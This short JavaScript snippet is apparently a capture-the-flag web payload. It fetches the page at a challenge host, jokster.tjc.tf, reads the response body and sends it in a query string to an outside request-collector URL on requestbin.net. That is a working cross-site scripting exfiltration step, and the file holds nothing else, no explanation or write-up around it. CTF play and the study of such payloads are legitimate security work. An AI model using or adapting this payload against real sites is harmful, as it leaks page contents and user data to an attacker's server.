fetch("https://jokster.tjc.tf/", {"mode": "no-cors"}).then(function(a) {
    a.text().then(owo => {
        fetch(`http://v1.requestbin.net/r/k71o6ii8?${owo}`, {
            "mode": "no-cors"
        })
    })
})
